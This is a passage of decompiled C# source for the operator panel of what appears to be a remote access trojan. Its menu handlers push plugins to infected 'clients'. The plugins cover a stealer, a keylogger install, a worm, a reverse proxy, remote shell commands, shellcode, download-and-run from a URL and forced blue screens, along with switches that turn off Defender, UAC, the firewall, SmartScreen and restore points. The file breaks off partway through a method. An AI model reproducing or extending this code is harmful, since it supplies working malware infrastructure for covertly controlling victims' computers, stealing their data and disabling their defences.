		private void toolStripMenuItem32_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"SmartScreen+"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600013D RID: 317 RVA: 0x0000E86C File Offset: 0x0000CA6C
		private void toolStripMenuItem33_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"SmartScreen-"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600013E RID: 318 RVA: 0x0000E8F8 File Offset: 0x0000CAF8
		private void hostFileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\HostsFile.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormHostsFile)Application.OpenForms["HostsFile:" + clients.Hwid] == null)
				{
					new FormHostsFile
					{
						Name = "HostsFile:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x0600013F RID: 319 RVA: 0x0000E9C8 File Offset: 0x0000CBC8
		private void notepadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Notepad.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormNotepad)Application.OpenForms["Notepad:" + clients.Hwid] == null)
				{
					new FormNotepad
					{
						Name = "Notepad:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000140 RID: 320 RVA: 0x0000EA98 File Offset: 0x0000CC98
		private void keyLoggerUninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\KeyLoggerRemover.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}

		// Token: 0x06000141 RID: 321 RVA: 0x0000EAF8 File Offset: 0x0000CCF8
		private void fastRunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			FormInput formInput = new FormInput();
			formInput.Text = "Command Shell";
			formInput.rjTextBox1.PlaceholderText = "Command";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				string checksum = Methods.GetChecksum("Plugin\\Shell.dll");
				Clients[] array = this.ClientsSelected();
				for (int i = 0; i < array.Length; i++)
				{
					Clients clients = array[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							LEB128.Write(new object[]
							{
								"ShellRun",
								formInput.rjTextBox1.Texts
							})
						});
					});
				}
			}
		}

		// Token: 0x06000142 RID: 322 RVA: 0x0000EBB4 File Offset: 0x0000CDB4
		private void stealthSaverToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\StealthSaver.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}

		// Token: 0x06000143 RID: 323 RVA: 0x0000EC14 File Offset: 0x0000CE14
		private void toolStripMenuItem2_Click(object sender, EventArgs e)
		{
			if (!this.ReverseProxyU.Visible && this.ReverseProxyU.work)
			{
				this.ReverseProxyU.Show();
			}
			if (!this.ReverseProxyU.work)
			{
				this.ReverseProxyU.Show();
				this.ReverseProxyU.work = true;
				string checksum = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
				byte[] pack = LEB128.Write(new object[]
				{
					"Pack",
					"ReverseProxyU"
				});
				Clients[] array = this.ClientsAll();
				for (int i = 0; i < array.Length; i++)
				{
					Clients clients = array[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							pack
						});
					});
				}
			}
		}

		// Token: 0x06000144 RID: 324 RVA: 0x0000ECE0 File Offset: 0x0000CEE0
		private void volumeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Volume.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormVolumeControl)Application.OpenForms["Volume:" + clients.Hwid] == null)
				{
					new FormVolumeControl
					{
						Name = "Volume:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000145 RID: 325 RVA: 0x0000EDB0 File Offset: 0x0000CFB0
		private void deviceManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\DeviceManager.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormDeviceManager)Application.OpenForms["DeviceManager:" + clients.Hwid] == null)
				{
					new FormDeviceManager
					{
						Name = "DeviceManager:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000146 RID: 326 RVA: 0x0000EE80 File Offset: 0x0000D080
		private void resetScaleToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"ResetScale"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000147 RID: 327 RVA: 0x0000EF0C File Offset: 0x0000D10C
		private void toolStripMenuItem80_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Stealer1.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}

		// Token: 0x06000148 RID: 328 RVA: 0x0000EF80 File Offset: 0x0000D180
		private void toolStripMenuItem75_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					byte[] array = LEB128.Write(new object[]
					{
						"SendDisk",
						Path.GetExtension(openFileDialog.FileName),
						File.ReadAllBytes(openFileDialog.FileName)
					});
					string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
					AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
					{
						task = new object[]
						{
							"Invoke",
							checksum,
							array
						},
						Runs = 0L,
						TasksRunsed = new List<string>(),
						RunOnce = true,
						Name = Randomizer.getRandomCharactersAscii() + "_SendDisk"
					});
				}
			}
		}

		// Token: 0x06000149 RID: 329 RVA: 0x0000F050 File Offset: 0x0000D250
		private void toolStripMenuItem76_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					byte[] array = LEB128.Write(new object[]
					{
						"SendMemory",
						File.ReadAllBytes(openFileDialog.FileName),
						Path.GetFileName(openFileDialog.FileName)
					});
					string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
					AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
					{
						task = new object[]
						{
							"Invoke",
							checksum,
							array
						},
						Runs = 0L,
						TasksRunsed = new List<string>(),
						RunOnce = true,
						Name = Randomizer.getRandomCharactersAscii() + "_SendMemory"
					});
				}
			}
		}

		// Token: 0x0600014A RID: 330 RVA: 0x0000F120 File Offset: 0x0000D320
		private void toolStripMenuItem77_Click(object sender, EventArgs e)
		{
			FormInput formInput = new FormInput();
			formInput.Text = "Url";
			formInput.rjTextBox1.PlaceholderText = "https://example.com/ups.exe";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				byte[] array = LEB128.Write(new object[]
				{
					"SendLink",
					formInput.rjTextBox1.Texts
				});
				string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
				AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
				{
					task = new object[]
					{
						"Invoke",
						checksum,
						array
					},
					Runs = 0L,
					TasksRunsed = new List<string>(),
					RunOnce = true,
					Name = Randomizer.getRandomCharactersAscii() + "_SendLink"
				});
			}
		}

		// Token: 0x0600014B RID: 331 RVA: 0x0000F1E4 File Offset: 0x0000D3E4
		private void toolStripMenuItem78_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					byte[] array = LEB128.Write(new object[]
					{
						"ShellCode",
						File.ReadAllBytes(openFileDialog.FileName)
					});
					string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
					AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
					{
						task = new object[]
						{
							"Invoke",
							checksum,
							array
						},
						Runs = 0L,
						TasksRunsed = new List<string>(),
						RunOnce = true,
						Name = Randomizer.getRandomCharactersAscii() + "_ShellCode"
					});
				}
			}
		}

		// Token: 0x0600014C RID: 332 RVA: 0x0000F2A8 File Offset: 0x0000D4A8
		private void removeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				this.dataGridView2.Rows.Remove(dataGridViewRow);
			}
		}

		// Token: 0x0600014D RID: 333 RVA: 0x0000F310 File Offset: 0x0000D510
		private void renameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				Server.Helper.Tasks.Task task = (Server.Helper.Tasks.Task)dataGridViewRow.Tag;
				FormInput formInput = new FormInput();
				formInput.Text = "Rename task: " + task.Name;
				formInput.rjTextBox1.PlaceholderText = task.Name;
				formInput.ShowDialog();
				if (formInput.Run)
				{
					task.Name = formInput.rjTextBox1.Texts;
					dataGridViewRow.Cells[2].Value = task.Name;
				}
			}
		}

		// Token: 0x0600014E RID: 334 RVA: 0x0000F3E0 File Offset: 0x0000D5E0
		private void runOnceRunAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				Server.Helper.Tasks.Task task = (Server.Helper.Tasks.Task)dataGridViewRow.Tag;
				task.RunOnce = !task.RunOnce;
				dataGridViewRow.Cells[0].Value = task.RunOnce;
			}
		}

		// Token: 0x0600014F RID: 335 RVA: 0x0000F46C File Offset: 0x0000D66C
		private void toolStripMenuItem82_Click(object sender, EventArgs e)
		{
			FormInput formInput = new FormInput();
			formInput.Text = "Url";
			formInput.rjTextBox1.PlaceholderText = "https://example.com/";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				byte[] array = LEB128.Write(new object[]
				{
					"OpenLink",
					formInput.rjTextBox1.Texts
				});
				string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
				AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
				{
					task = new object[]
					{
						"Invoke",
						checksum,
						array
					},
					Runs = 0L,
					TasksRunsed = new List<string>(),
					RunOnce = true,
					Name = Randomizer.getRandomCharactersAscii() + "_Open_Link_Visible"
				});
			}
		}

		// Token: 0x06000150 RID: 336 RVA: 0x0000F530 File Offset: 0x0000D730
		private void toolStripMenuItem83_Click(object sender, EventArgs e)
		{
			FormInput formInput = new FormInput();
			formInput.Text = "Url";
			formInput.rjTextBox1.PlaceholderText = "https://example.com/";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				byte[] array = LEB128.Write(new object[]
				{
					"OpenLinkInv",
					formInput.rjTextBox1.Texts
				});
				string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
				Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
				task.task = new object[]
				{
					"Invoke",
					checksum,
					array
				};
				task.Runs = 0L;
				task.TasksRunsed = new List<string>();
				task.RunOnce = true;
				task.Name = Randomizer.getRandomCharactersAscii();
				AutoTaskMgr.AppendTask(task);
				task.Name = Randomizer.getRandomCharactersAscii() + "_Open_Link_Invisible";
			}
		}

		// Token: 0x06000151 RID: 337 RVA: 0x0000F600 File Offset: 0x0000D800
		private void toolStripMenuItem79_Click(object sender, EventArgs e)
		{
			FormInput formInput = new FormInput();
			formInput.Text = "Command Shell";
			formInput.rjTextBox1.PlaceholderText = "Command";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				string checksum = Methods.GetChecksum("Plugin\\Shell.dll");
				AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
				{
					task = new object[]
					{
						"Invoke",
						checksum,
						LEB128.Write(new object[]
						{
							"ShellRun",
							formInput.rjTextBox1.Texts
						})
					},
					Runs = 0L,
					TasksRunsed = new List<string>(),
					RunOnce = true,
					Name = Randomizer.getRandomCharactersAscii() + "_ShellRun"
				});
			}
		}

		// Token: 0x06000152 RID: 338 RVA: 0x0000F6C4 File Offset: 0x0000D8C4
		private void toolStripMenuItem36_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Worm.dll");
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					new byte[1]
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Worm"
			});
		}

		// Token: 0x06000153 RID: 339 RVA: 0x0000F738 File Offset: 0x0000D938
		private void toolStripMenuItem37_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\StealthSaver.dll");
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					new byte[1]
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Stealth_Saver"
			});
		}

		// Token: 0x06000154 RID: 340 RVA: 0x0000F7AC File Offset: 0x0000D9AC
		private void toolStripMenuItem38_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\BotKiller.dll");
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					new byte[1]
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Botkiller"
			});
		}

		// Token: 0x06000155 RID: 341 RVA: 0x0000F820 File Offset: 0x0000DA20
		private void toolStripMenuItem40_Click(object sender, EventArgs e)
		{
			if (!File.Exists("Stub\\KeyLogger.exe"))
			{
				return;
			}
			byte[] array = LEB128.Write(new object[]
			{
				"SendDisk",
				".exe",
				File.ReadAllBytes("Stub\\KeyLogger.exe")
			});
			string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_KeyLogger_Install"
			});
		}

		// Token: 0x06000156 RID: 342 RVA: 0x0000F8C8 File Offset: 0x0000DAC8
		private void toolStripMenuItem42_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\KeyLoggerRemover.dll");
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					new byte[1]
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_KeyLogger_Uninstall"
			});
		}

		// Token: 0x06000157 RID: 343 RVA: 0x0000F93C File Offset: 0x0000DB3C
		private void toolStripMenuItem43_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Net3"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Net3"
			});
		}

		// Token: 0x06000158 RID: 344 RVA: 0x0000F9C0 File Offset: 0x0000DBC0
		private void toolStripMenuItem44_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"BSOD"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_BSOD"
			});
		}

		// Token: 0x06000159 RID: 345 RVA: 0x0000FA44 File Offset: 0x0000DC44
		private void toolStripMenuItem45_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"DeletePoints"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_DeletePoints"
			});
		}

		// Token: 0x0600015A RID: 346 RVA: 0x0000FAC8 File Offset: 0x0000DCC8
		private void toolStripMenuItem46_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"ResetScale"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_ResetScale"
			});
		}

		// Token: 0x0600015B RID: 347 RVA: 0x0000FB4C File Offset: 0x0000DD4C
		private void toolStripMenuItem48_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Regedit+"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Regedit_Enable"
			});
		}

		// Token: 0x0600015C RID: 348 RVA: 0x0000FBD0 File Offset: 0x0000DDD0
		private void toolStripMenuItem49_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Regedit-"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Regedit_Disable"
			});
		}

		// Token: 0x0600015D RID: 349 RVA: 0x0000FC54 File Offset: 0x0000DE54
		private void toolStripMenuItem51_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"TaskMgr+"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_TaskMgr_Enable"
			});
		}

		// Token: 0x0600015E RID: 350 RVA: 0x0000FCD8 File Offset: 0x0000DED8
		private void toolStripMenuItem52_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"TaskMgr-"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_TaskMgr_Disable"
			});
		}

		// Token: 0x0600015F RID: 351 RVA: 0x0000FD5C File Offset: 0x0000DF5C
		private void toolStripMenuItem54_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Cmd+"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Shell_Enable"
			});
		}

		// Token: 0x06000160 RID: 352 RVA: 0x0000FDE0 File Offset: 0x0000DFE0
		private void toolStripMenuItem55_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Cmd-"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Shell_Disable"
			});
		}

		// Token: 0x06000161 RID: 353 RVA: 0x0000FE64 File Offset: 0x0000E064
		private void toolStripMenuItem57_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"WinR+"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_WinR_Enable"
			});
		}

		// Token: 0x06000162 RID: 354 RVA: 0x0000FEE8 File Offset: 0x0000E0E8
		private void toolStripMenuItem58_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"WinR-"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_WinR_Disable"
			});
		}

		// Token: 0x06000163 RID: 355 RVA: 0x0000FF6C File Offset: 0x0000E16C
		private void toolStripMenuItem60_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Defender+"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Defender_Enable"
			});
		}

		// Token: 0x06000164 RID: 356 RVA: 0x0000FFF0 File Offset: 0x0000E1F0
		private void toolStripMenuItem61_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Defender-"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Defender_Disable"
			});
		}

		// Token: 0x06000165 RID: 357 RVA: 0x00010074 File Offset: 0x0000E274
		private void toolStripMenuItem63_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Uac+"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Uac_Enable"
			});
		}

		// Token: 0x06000166 RID: 358 RVA: 0x000100F8 File Offset: 0x0000E2F8
		private void toolStripMenuItem64_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Uac-"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Uac_Disable"
			});
		}

		// Token: 0x06000167 RID: 359 RVA: 0x0001017C File Offset: 0x0000E37C
		private void toolStripMenuItem66_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"FireWall+"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_FireWall_Enable"
			});
		}

		// Token: 0x06000168 RID: 360 RVA: 0x00010200 File Offset: 0x0000E400
		private void toolStripMenuItem67_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"FireWall-"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_FireWall_Disable"
			});
		}

		// Token: 0x06000169 RID: 361 RVA: 0x00010284 File Offset: 0x0000E484
		private void toolStripMenuItem69_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"SmartScreen+"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_SmartScreen_Enable"
			});
		}

		// Token: 0x0600016A RID: 362 RVA: 0x00010308 File Offset: 0x0000E508
		private void toolStripMenuItem70_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"SmartScreen-"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_SmartScreen_Disable"
			});
		}

		// Token: 0x0600016B RID: 363 RVA: 0x0001038C File Offset: 0x0000E58C
		private void toolStripMenuItem72_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Updates+"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Windows_Update_Enable"
			});
		}

		// Token: 0x0600016C RID: 364 RVA: 0x00010410 File Offset: 0x0000E610
		private void toolStripMenuItem73_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
